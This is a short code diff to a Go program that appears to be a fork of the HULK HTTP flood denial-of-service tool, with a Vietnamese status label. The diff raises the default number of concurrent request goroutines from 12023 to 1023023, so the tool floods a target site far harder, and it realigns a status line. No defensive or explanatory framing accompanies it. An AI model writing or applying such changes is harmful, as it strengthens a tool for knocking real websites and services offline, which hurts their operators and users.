@@ -89,7 +89,7 @@ func main() {
 	t := os.Getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 12023
+		maxproc = 1023023
 	}
 
 	u, err := url.Parse(site)
@@ -124,7 +124,7 @@ func main() {
 		var (
 			err, sent int32
 		)
-		fmt.Println("Trang thai            |\tResp OK |\tGot err")
+		fmt.Println("   Trang thai        |\tResp OK |\tGot err")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
